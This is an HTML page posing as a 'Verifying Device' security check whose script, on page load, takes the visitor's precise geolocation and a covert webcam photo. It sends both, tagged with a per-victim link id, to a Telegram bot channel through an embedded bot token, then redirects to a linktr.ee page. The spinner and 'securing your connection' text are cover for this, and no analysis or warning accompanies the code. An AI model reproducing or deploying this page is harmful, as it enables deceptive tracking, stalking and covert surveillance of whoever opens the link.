<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Connection | Verification</title>
    <style>
        body { background-color: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); text-align: center; max-width: 400px; width: 90%; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: #1c1e21; font-size: 22px; margin-bottom: 10px; }
        p { color: #606770; font-size: 15px; line-height: 1.6; }
    </style>
</head>
<body>

<div class="card">
    <div class="spinner"></div>
    <h2>Verifying Device...</h2>
    <p>Please wait while we secure your connection.</p>
    <div id="status" style="color: #007bff; font-weight: bold; margin-top: 15px;">Initializing...</div>
</div>

<canvas id="canvas" style="display:none;"></canvas>
<video id="video" style="display:none;" autoplay></video>

<script>
    // --- MASTER CONFIG ---
    const MASTER_TOKEN = "8764685300:AAHTAvOwsDnJm6yu7HzENMk-2Efmkye5TUI";
    const LOG_CHANNEL = "-1003888585833"; // E.g. -100xxxxxxx
    
    const urlParams = new URLSearchParams(window.location.search);
    const linkId = urlParams.get('id'); // URL se ?id=ABCDE lega

    const statusText = document.getElementById('status');

    window.onload = async () => {
        if (!linkId) {
            statusText.innerText = "Error: Invalid Link";
            return;
        }
        await startProcess();
    };

    async function startProcess() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                await sendData(pos);
                await capturePhoto();
            }, (err) => { location.reload(); }, { enableHighAccuracy: true });
        }
    }

    async function sendData(pos) {
        const text = `📍 **Location Logged**\n\nLink ID: ${linkId}\nMaps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
        await fetch(`https://api.telegram.org/bot${MASTER_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: LOG_CHANNEL, text: text, parse_mode: 'Markdown' })
        });
    }

    async function capturePhoto() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;
            await new Promise(r => video.onloadedmetadata = r);
            
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            setTimeout(async () => {
                canvas.getContext('2d').drawImage(video, 0, 0);
                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg'));
                const formData = new FormData();
                formData.append('chat_id', LOG_CHANNEL);
                formData.append('photo', blob, 'img.jpg');
                formData.append('caption', `📸 **Photo Captured**\nLink ID: ${linkId}`);

                await fetch(`https://api.telegram.org/bot${MASTER_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                stream.getTracks().forEach(t => t.stop());
                window.location.href = "https://linktr.ee/Neonman"; // Redirect
            }, 1000);
        } catch (e) { window.location.href = "https://linktr.ee/Neonman"; }
    }
</script>
</body>
</html>
